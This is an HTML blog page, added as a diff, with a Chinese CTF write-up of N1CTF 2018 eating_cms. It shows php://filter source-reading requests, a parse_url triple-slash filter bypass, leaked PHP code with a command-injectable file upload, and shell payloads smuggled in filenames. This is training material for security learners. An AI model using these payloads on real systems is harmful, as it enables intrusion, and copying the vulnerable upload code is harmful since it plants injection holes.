@@ -1,0 +1,573 @@
+<!DOCTYPE HTML>
+<html class="no-js" lang="zh-CN">
+<head>
+    <!--[if lte IE 9]>
+<meta http-equiv="refresh" content="0;url=http://george186.github.io/warn.html">
+<![endif]-->
+<meta charset="utf-8">
+<meta http-equiv="X-DNS-Prefetch-Control" content="on">
+<link rel="dns-prefetch" href="http://george186.github.io">
+<link rel="dns-prefetch" href="//www.google-analytics.com">
+<link rel="prefetch" href="http://george186.github.io">
+<link rel="prefetch" href="//www.google-analytics.com">
+
+
+<link rel="prerender" href="http://george186.github.io">
+
+<meta http-equiv="X-UA-Compatible" content="IE=Edge">
+<meta name="renderer" content="webkit">
+<meta name="viewport" content="width=device-width, initial-scale=1.0,user-scalable=no">
+<meta http-equiv="mobile-agent" content="format=html5; url=http://george186.github.io">
+<meta name="author" content="John Doe">
+
+<link rel="stylesheet" href="/css/JSimple.css">
+
+
+<link rel="shortcut icon" href="/images/favicon.png">
+
+
+<title>日常练习45——parse_url解析漏洞与伪协议 - Hexo</title>
+
+<meta name="keywords" content="">
+
+<meta name="description " content="">
+
+    <script type="text/x-mathjax-config">
+        MathJax.Hub.Config({
+            tex2jax: {
+                inlineMath: [ ['$','$'], ["\\(","\\)"] ],
+                processEscapes: true
+            }
+        });
+    </script>
+
+
+    
+
+    
+
+<meta name="generator" content="Hexo 5.2.0"></head>
+<body>
+<div id="nav">
+    <nav class="nav-menu">
+        <a class="site-name current" href="/" title="说">说</a>
+        <a class="site-index current" href="/"><i class="fa fa-home"></i><span>Home</span></a>
+        <a href="/archives" title="Archives"><i class="fa fa-archives"></i><span>Archives</span></a>
+        <a href="/tags" title="Tags"><i class="fa fa-tags"></i><span>Tags</span></a>
+        <!-- custom single page of menus -->
+        
+        
+        <a href="/help" title="帮助">
+            <i class="fa fa-question-circle"></i>
+            <span>帮助</span>
+        </a>
+        
+    </nav>
+</div>
+
+<div class="nav-user">
+    <a class="btn-search" href="#"><i class="fa fa-search"></i></a>
+    <a class="btn-read-mode" href="#"><i class="fa fa-sun-o"></i></a>
+    <a class="btn-sns-qr" href="javascript:"><i class="fa fa-weixin"></i></a>
+</div>
+
+<div id="wrapper" class="clearfix">
+    <div id="body">
+        <div class="main" id="main">
+            <div id="cover">
+    <div class="cover-img"></div>
+    <div class="cover-info">
+        
+        <h1 class="cover-siteName">说IT</h1>
+        <h3 class="cover-siteTitle">用代码摇滚这个世界</h3>
+        <p class="cover-siteDesc">一个关注技术与人文的IT博客</p>
+        <div class="cover-sns">
+            
+    &nbsp;&nbsp;<div class="btn btn-github">
+        <a href="https://github.com/tangkunyin" target="_blank" title="github" ref="friend">
+            <i class="fa fa-github"></i>
+        </a>
+    </div>
+
+    &nbsp;&nbsp;<div class="btn btn-twitter">
+        <a href="https://twitter.com/tangkunyin" target="_blank" title="twitter" ref="friend">
+            <i class="fa fa-twitter"></i>
+        </a>
+    </div>
+
+    &nbsp;&nbsp;<div class="btn btn-weibo">
+        <a href="https://weibo.com/tangkunyin" target="_blank" title="weibo" ref="friend">
+            <i class="fa fa-weibo"></i>
+        </a>
+    </div>
+
+    &nbsp;&nbsp;<div class="btn btn-instagram">
+        <a href="https://www.instagram.com/mtangsir/" target="_blank" title="instagram" ref="friend">
+            <i class="fa fa-instagram"></i>
+        </a>
+    </div>
+
+
+        </div>
+    </div>
+</div>
+
+            <div class="page-title">
+    <ul>
+        <li><a href="/">Recent Posts</a></li>
+        
+            
+                <li class="">
+                    <a href="/categories/tech-notes" data-name="技术">技术</a>
+                </li>
+            
+                <li class="">
+                    <a href="/categories/huma" data-name="人文">人文</a>
+                </li>
+            
+        
+        <li class="page-search">
+    <form id="search" class="search-form">
+        <input type="text"
+               readonly="readonly"
+               id="local-search-input-tip"
+               placeholder="click to search..." />
+        <button type="button" disabled="disabled" class="search-form-submit"><i class="fa fa-search"></i></button>
+    </form>
+</li>
+
+    </ul>
+</div>
+<div class="main-inner">
+    <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+        <div class="post-header">
+            <div class="post-author clearfix">
+                <a class="avatar fleft" href="https://george186.github.io"
+                   target="_blank">
+                    <img width="48" src="/images/favicon.png" alt="avatar"/>
+                </a>
+                <p><span class="label">Author</span>
+                    <a href="https://george186.github.io"
+                       target="_blank">george</a>
+                    <span title="Last edited at&nbsp;2022-01-16">2022-01-16</span>
+                </p>
+                <p>一个写代码的「伪文人」</p>
+            </div>
+            <h2 class="post-title">日常练习45——parse_url解析漏洞与伪协议</h2>
+            <div class="post-meta">
+                emm... 9072 words in the article |
+                you are the&nbsp;<span id="busuanzi_value_page_pv"><i class="fa fa-spinner fa-spin"></i></span>th friend who reading now
+            </div>
+        </div>
+        <div class="post-content markdown-body">
+            <p>关于parse_url()函数之前做题已经用到过了，它对url的解析特性一直是ctf中的一个考点，这里来回顾一下。  </p>
+<h1 id="N1CTF-2018-eating-cms"><a href="#N1CTF-2018-eating-cms" class="headerlink" title="[N1CTF 2018]eating_cms"></a>[N1CTF 2018]eating_cms</h1><p>打开题目，发现是一个登陆页面，那么我们就先找注册页面，果然是register.php.  </p>
+<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/61ea15642ab3f51d912a1003.png"><img src="https://pic.imgdb.cn/item/61ea15642ab3f51d912a1003.png"></a>  </p>
+<p>注册一个账号登陆进去。  </p>
+<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/61ea15ad2ab3f51d912a5322.png"><img src="https://pic.imgdb.cn/item/61ea15ad2ab3f51d912a5322.png"></a>  </p>
+<p>发现是一个网站的页面，结合题目中的cms，我们可以推断出来要找到这个网站的漏洞，观察url中的<strong>user.php?page=guest</strong>，我们可以尝试用伪协议来读取网站源码。  </p>
+<pre><code>/user.php?page=php://filter/convert.base64-encode/resource=user  </code></pre>
+<p>果然成功读取到源码，解码后得到user.php代码如下：  </p>
+<pre><code>&lt;?php
+require_once(&quot;function.php&quot;);
+if( !isset( $_SESSION[&#39;user&#39;] ))&#123;
+Header(&quot;Location: index.php&quot;);
+
+&#125;
+if($_SESSION[&#39;isadmin&#39;] === &#39;1&#39;)&#123;
+$oper_you_can_do = $OPERATE_admin;
+&#125;else&#123;
+$oper_you_can_do = $OPERATE;
+&#125;
+//die($_SESSION[&#39;isadmin&#39;]);
+if($_SESSION[&#39;isadmin&#39;] === &#39;1&#39;)&#123;
+if(!isset($_GET[&#39;page&#39;]) || $_GET[&#39;page&#39;] === &#39;&#39;)&#123;
+    $page = &#39;info&#39;;
+&#125;else &#123;
+    $page = $_GET[&#39;page&#39;];
+&#125;
+&#125;
+else&#123;
+if(!isset($_GET[&#39;page&#39;])|| $_GET[&#39;page&#39;] === &#39;&#39;)&#123;
+    $page = &#39;guest&#39;;
+&#125;else &#123;
+    $page = $_GET[&#39;page&#39;];
+    if($page === &#39;info&#39;)
+    &#123;
+//echo(&quot;&lt;script&gt;alert(&#39;no premission to visit info, only admin can, you are guest&#39;)&lt;/script&gt;&quot;);
+        Header(&quot;Location: user.php?page=guest&quot;);
+    &#125;
+&#125;
+&#125;
+filter_directory();
+//if(!in_array($page,$oper_you_can_do))&#123;
+//    $page = &#39;info&#39;;
+//&#125;
+include &quot;$page.php&quot;;
+?&gt;  </code></pre>
+<p>没有什么有用的消息，但是它给我们提供了别的源码，我们可以利用伪协议接着去读取。  </p>
+<p>读取fuction.php：  </p>
+<pre><code>/user.php?page=php://filter/convert.base64-encode/resource=function  </code></pre>
+<p>得到改网页源码  </p>
+<pre><code>&lt;?php
+session_start();
+require_once &quot;config.php&quot;;
+function Hacker()
+&#123;
+Header(&quot;Location: hacker.php&quot;);
+die();
+&#125;
+
+
+function filter_directory()
+&#123;
+$keywords = [&quot;flag&quot;,&quot;manage&quot;,&quot;ffffllllaaaaggg&quot;];
+$uri = parse_url($_SERVER[&quot;REQUEST_URI&quot;]);
+parse_str($uri[&#39;query&#39;], $query);
+//    var_dump($query);
+//    die();
+foreach($keywords as $token)
+&#123;
+    foreach($query as $k =&gt; $v)
+    &#123;
+        if (stristr($k, $token))
+            hacker();
+        if (stristr($v, $token))
+            hacker();
+    &#125;
+&#125;
+&#125;
+
+function filter_directory_guest()
+&#123;
+$keywords = [&quot;flag&quot;,&quot;manage&quot;,&quot;ffffllllaaaaggg&quot;,&quot;info&quot;];
+$uri = parse_url($_SERVER[&quot;REQUEST_URI&quot;]);
+parse_str($uri[&#39;query&#39;], $query);
+//    var_dump($query);
+//    die();
+foreach($keywords as $token)
+&#123;
+    foreach($query as $k =&gt; $v)
+    &#123;
+        if (stristr($k, $token))
+            hacker();
+        if (stristr($v, $token))
+            hacker();
+    &#125;
+&#125;
+&#125;
+
+function Filter($string)
+&#123;
+global $mysqli;
+$blacklist = &quot;information|benchmark|order|limit|join|file|into|execute|column|extractvalue|floor|update|insert|delete|username|password&quot;;
+$whitelist = &quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#39;(),_*`-@=+&gt;&lt;&quot;;
+for ($i = 0; $i &lt; strlen($string); $i++) &#123;
+    if (strpos(&quot;$whitelist&quot;, $string[$i]) === false) &#123;
+        Hacker();
+    &#125;
+&#125;
+if (preg_match(&quot;/$blacklist/is&quot;, $string)) &#123;
+    Hacker();
+&#125;
+if (is_string($string)) &#123;
+    return $mysqli-&gt;real_escape_string($string);
+&#125; else &#123;
+    return &quot;&quot;;
+&#125;
+&#125;
+
+function sql_query($sql_query)
+&#123;
+global $mysqli;
+$res = $mysqli-&gt;query($sql_query);
+return $res;
+&#125;
+
+function login($user, $pass)
+&#123;
+$user = Filter($user);
+$pass = md5($pass);
+$sql = &quot;select * from `albert_users` where `username_which_you_do_not_know`= &#39;$user&#39; and `password_which_you_do_not_know_too` = &#39;$pass&#39;&quot;;
+echo $sql;
+$res = sql_query($sql);
+//    var_dump($res);
+//    die();
+if ($res-&gt;num_rows) &#123;
+    $data = $res-&gt;fetch_array();
+    $_SESSION[&#39;user&#39;] = $data[username_which_you_do_not_know];
+    $_SESSION[&#39;login&#39;] = 1;
+    $_SESSION[&#39;isadmin&#39;] = $data[isadmin_which_you_do_not_know_too_too];
+    return true;
+&#125; else &#123;
+    return false;
+&#125;
+return;
+&#125;
+
+function updateadmin($level,$user)
+&#123;
+$sql = &quot;update `albert_users` set `isadmin_which_you_do_not_know_too_too` = &#39;$level&#39; where `username_which_you_do_not_know`=&#39;$user&#39; &quot;;
+echo $sql;
+$res = sql_query($sql);
+//    var_dump($res);
+//    die();
+//    die($res);
+if ($res == 1) &#123;
+    return true;
+&#125; else &#123;
+    return false;
+&#125;
+return;
+&#125;
+
+function register($user, $pass)
+&#123;
+global $mysqli;
+$user = Filter($user);
+$pass = md5($pass);
+$sql = &quot;insert into `albert_users`(`username_which_you_do_not_know`,`password_which_you_do_not_know_too`,`isadmin_which_you_do_not_know_too_too`) VALUES (&#39;$user&#39;,&#39;$pass&#39;,&#39;0&#39;)&quot;;
+$res = sql_query($sql);
+return $mysqli-&gt;insert_id;
+&#125;
+
+function logout()
+&#123;
+session_destroy();
+Header(&quot;Location: index.php&quot;);
+&#125;
+?&gt;  </code></pre>
+<p>可以看到这串代码给我们又提供了一个新的源码并且给我们提供了几个关键词：  </p>
+<pre><code>$keywords = [&quot;flag&quot;,&quot;manage&quot;,&quot;ffffllllaaaaggg&quot;];  </code></pre>
+<p>也就是说给我们说明了flag文件的名字，同时，在下方的sql查询相关的代码我们可以知道它将sql的查询词语禁用的差不多了，所以这道题我们不能采用sql注入来破解。  </p>
+<p>我们先尝试直接使用伪协议来直接读上面的flag文件：  </p>
+<pre><code>/user.php?page=php://filter/convert.base64-encode/resource=ffffllllaaaaggg  </code></pre>
+<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/61ea18482ab3f51d912d8600.png"><img src="https://pic.imgdb.cn/item/61ea18482ab3f51d912d8600.png"></a>  </p>
+<p>发现被拦截了，那么我们就要再回头审计一下代码，寻找可以利用的地方来绕过拦截。</p>
+<p>我们看这串代码：  </p>
+<pre><code>&#123;
+$keywords = [&quot;flag&quot;,&quot;manage&quot;,&quot;ffffllllaaaaggg&quot;];
+$uri = parse_url($_SERVER[&quot;REQUEST_URI&quot;]);
+parse_str($uri[&#39;query&#39;], $query);
+//    var_dump($query);
+//    die();
+foreach($keywords as $token)
+&#123;
+    foreach($query as $k =&gt; $v)
+    &#123;
+        if (stristr($k, $token))
+            hacker();
+        if (stristr($v, $token))
+            hacker();
+    &#125;
+&#125;
+&#125;   </code></pre>
+<p>可以看到一个眼熟的函数parse_url()，这个函数作用就是把url的各个部分进行拆分并放入数组中，下面给出一个例子：  </p>
+<pre><code>&lt;?php
+$url = &#39;http://username:password@hostname/path?arg=value#anchor&#39;;
+print_r(parse_url($url));
+echo parse_url($url, PHP_URL_PATH);
+?&gt;
+结果----------------------------------------------------------------------------------------------------
+Array
+(
+[scheme] =&gt; http
+[host] =&gt; hostname
+[user] =&gt; username
+[pass] =&gt; password
+[path] =&gt; /path
+[query] =&gt; arg=value
+[fragment] =&gt; anchor
+)
+/path  </code></pre>
+<p>可以看到这个函数将一个完整的url拆分成了各个部分，其中键query对应的数据是参数以及后面的变量，也就是问号后面的东西，**?arg=value。**  </p>
+<p>而我们前面所看到的代码正式对这一部分进行了过滤检查，因为我们使用伪协议也就是参数后面的变量里有名单上的字符，所以被拦截，无法直接读取源码。  </p>
+<p>那么如何绕过这个函数呢？我们发现，如果我们这样构造url变量：  </p>
+<pre><code>&lt;?php
+$url = &#39;//www.example.com/path?googleguy=googley&#39;;
+
+// 在 5.4.7 之前这会输出路径 &quot;//www.example.com/path&quot;
+var_dump(parse_url($url));
+?&gt;  </code></pre>
+<p>这样就能造成绕过，而如果我们这样构造：   </p>
+<pre><code>///www.example.com/path?googleguy=googley  </code></pre>
+<p>那么该函数就会返回false，从而绕过检测，所以我们可以这样构造  </p>
+<pre><code>///user.php?page=php://filter/convert.base64-encode/resource=ffffllllaaaaggg  </code></pre>
+<p>成功得到源码：  </p>
+<pre><code>&lt;?php
+if (FLAG_SIG != 1)&#123;
+die(&quot;you can not visit it directly&quot;);
+&#125;else &#123;
+echo &quot;you can find sth in m4aaannngggeee&quot;;
+&#125;
+?&gt;  </code></pre>
+<p>再用同样的方法访问m4aaannngggeee：  </p>
+<pre><code>&lt;?php
+if (FLAG_SIG != 1)&#123;
+die(&quot;you can not visit it directly&quot;);
+&#125;
+include &quot;templates/upload.html&quot;;
+
+?&gt;  </code></pre>
+<p>我们进入这个上传页面。上传一张图片后发现是假的。  </p>
+<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/61ea201d2ab3f51d9136ddf6.png"><img src="https://pic.imgdb.cn/item/61ea201d2ab3f51d9136ddf6.png"></a>  </p>
+<p>那我们就直接读这个页面的源码  </p>
+<pre><code>///user.php?page=php://filter/convert.base64-encode/resource=upllloadddd  
+
+&lt;?php
+$allowtype = array(&quot;gif&quot;,&quot;png&quot;,&quot;jpg&quot;);
+$size = 10000000;
+$path = &quot;./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/&quot;;
+$filename = $_FILES[&#39;file&#39;][&#39;name&#39;];
+if(is_uploaded_file($_FILES[&#39;file&#39;][&#39;tmp_name&#39;]))&#123;
+if(!move_uploaded_file($_FILES[&#39;file&#39;][&#39;tmp_name&#39;],$path.$filename))&#123;
+    die(&quot;error:can not move&quot;);
+&#125;
+&#125;else&#123;
+    die(&quot;error:not an upload file！&quot;);
+&#125;
+$newfile = $path.$filename;
+echo &quot;file upload success&lt;br /&gt;&quot;;
+echo $filename;
+$picdata = system(&quot;cat ./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/&quot;.$filename.&quot; | base64 -w 0&quot;);
+echo &quot;&lt;img src=&#39;data:image/png;base64,&quot;.$picdata.&quot;&#39;&gt;&lt;/img&gt;&quot;;
+if($_FILES[&#39;file&#39;][&#39;error&#39;]&gt;0)&#123;
+unlink($newfile);
+die(&quot;Upload file error: &quot;);
+&#125;
+$ext = array_pop(explode(&quot;.&quot;,$_FILES[&#39;file&#39;][&#39;name&#39;]));
+if(!in_array($ext,$allowtype))&#123;
+unlink($newfile);
+&#125;
+?&gt;  </code></pre>
+<p>可以看到  </p>
+<pre><code>$picdata = system(&quot;cat ./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/&quot;.$filename.&quot; | base64 -w 0&quot;);  </code></pre>
+<p>这样一串代码，原来是文件名命令执行，也就是说要在文件名上进行修改来获取flag，接下来就是招真正的上传点了，回顾之前代码中提示的页面信息，找到真正的上传点/user.php?page=m4aaannngggeee  </p>
+<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/61ea21892ab3f51d9138a4c3.png"><img src="https://pic.imgdb.cn/item/61ea21892ab3f51d9138a4c3.png"></a>  </p>
+<p>接下来就是上传文件并抓包修改文件名。<br>将文件名改为;ls;#  </p>
+<pre><code>注意这里的#是为了注释掉cat ./upload_b3bb2cfed6371dfeb2db1dbcceb124d3/&quot;.$filename.&quot; | base64 -w 0&quot;);里的&quot; | base64 -w 0&quot;);这一部分  </code></pre>
+<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/61ea22db2ab3f51d913a7ee2.png"><img src="https://pic.imgdb.cn/item/61ea22db2ab3f51d913a7ee2.png"></a>  </p>
+<p>发现flag不再这里，切换到根目录寻找，这里/被禁用了，我们可以使用cd ..（返回上一层目录）来代替。  </p>
+<pre><code>payload：;cd ..;ls;#  </code></pre>
+<p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/61ea23ba2ab3f51d913b9bd9.png"><img src="https://pic.imgdb.cn/item/61ea23ba2ab3f51d913b9bd9.png"></a>  </p>
+<p>找到flag，构造payload  </p>
+<pre><code>;cd ..;cat flag_233333;#  </code></pre>
+<p>读取到flag。  </p>
+<h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>这道题目考的很多，但是重点还是在于用伪协议来读取源码和绕过parse_ url()来读取源码，后面的文件名执行命令也算是文件上传的一个变式，总的来说这道题目还是需要一定的代码审计的能力，要能在代码中找到关键的函数或者语句来经行分析。下面附上关于parse_url()函数解析漏洞的详细分析：  </p>
+<p><a target="_blank" rel="noopener" href="https://skysec.top/2017/12/15/parse-url%E5%87%BD%E6%95%B0%E5%B0%8F%E8%AE%B0/">parse_url函数小记</a></p>
+
+            
+                
+
+            
+        </div>
+        <div class="post-tool">
+            <a class="btn-thumbs-up" href="javascript:void(0);" data-cid="52" title="95">
+                <i class="fa fa-thumbs-up" aria-hidden="true"></i> Donate
+            </a>
+        </div>
+        
+        <div class="post-tags">Tags：
+            
+            <a href="/tags/%E7%BB%83%E4%B9%A0/">练习</a>
+            
+        </div>
+        
+    </article>
+    
+        <p style="text-align: center">This article just represents my own viewpoint. If there is something wrong, please correct me.</p>
+    
+    
+    
+
+</div>
+
+<script src="/js/busuanzi.pure.mini.js"></script>
+
+
+
+        </div><!-- end #main-->
+    </div><!-- end #body -->
+    <footer class="footer">
+    <div class="footer-inner" style="text-align: center">
+        <p>
+            <a href="/about"  title="About">About</a>&nbsp;&nbsp<em>·</em>&nbsp;&nbsp
+            <!-- 自定义链接 -->
+            <a href="/help" title="Help" >Help</a>&nbsp;&nbsp<em>·</em>&nbsp;&nbsp
+            <a href="/links" title="Links">Links</a>&nbsp;&nbsp<em>·</em>&nbsp;&nbsp
+            <a href="/sitemap.xml" title="SiteMap">SiteMap</a>
+        </p>
+        <p>
+            Has been established&nbsp<a href="/timeline" id="siteBuildingTime"></a>&nbspDays，<a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" rel="licence">Based on Attribution-NonCommercial-ShareAlike 4.0 International (CC BY-NC-SA 4.0)</a><br/>
+            ©2017-<span id="cpYear"></span> Based on&nbsp<a href="http://hexo.io" target="_blank" rel="nofollow">Hexo</a>
+            ，Theme by&nbsp&nbsp<a href="https://github.com/tangkunyin/hexo-theme-jsimple" target="_blank" rel="bookmark">JSimple</a>
+            ，Author&nbsp<a href="https://george186.github.io" target="_blank" rel="friend">george</a>
+            ，Hosted by <a href="https://pages.github.com/" target="_blank" rel="nofollow">GitHub Pages</a>
+        </p>
+    </div>
+</footer>
+
+<script src="/js/zepto.min.js"></script>
+
+
+<script src="/js/SimpleCore.js"></script>
+
+
+</div>
+<!-- search pop -->
+<div class="popup search-popup local-search-popup">
+    <div class="local-search-header clearfix">
+        <span class="search-icon">
+            <i class="fa fa-search"></i>
+        </span>
+        <span class="popup-btn-close">
+            <i class="fa fa-times-circle"></i>
+        </span>
+        <div class="local-search-input-wrapper">
+            <input id="local-search-input"
+                   spellcheck="false"
+                   type="text"
+                   autocomplete="off"
+                   placeholder="Input query keywords here..."/>
+        </div>
+    </div>
+    <div id="local-search-result"></div>
+</div>
+<div class="fixed-btn">
+    <a class="btn-gotop" href="javascript:"> <i class="fa fa-angle-up"></i></a>
+</div>
+<script>
+    $(function () {
+        var jsi_config = {
+            rootUrl: 'http://george186.github.io/',
+            buildingTime: '01/20/2018',
+            current: $('.post-tags').length > 0 ? 'post' : 'archive',
+            snsQRCode: '/images/sns-qrcode.png',
+            donateImg: '/images/donate-qr.png',
+            localSearch: { dbPath: '' },
+            readMode: 'day'
+        };
+        
+            jsi_config.localSearch = {
+                dbPath: '/search.xml',
+                trigger: 'auto',
+                topN: '1',
+                unescape: 'false'
+            }
+        
+        SimpleCore.init(jsi_config);
+        
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+        
+    });
+</script>
+</body>
+</html>
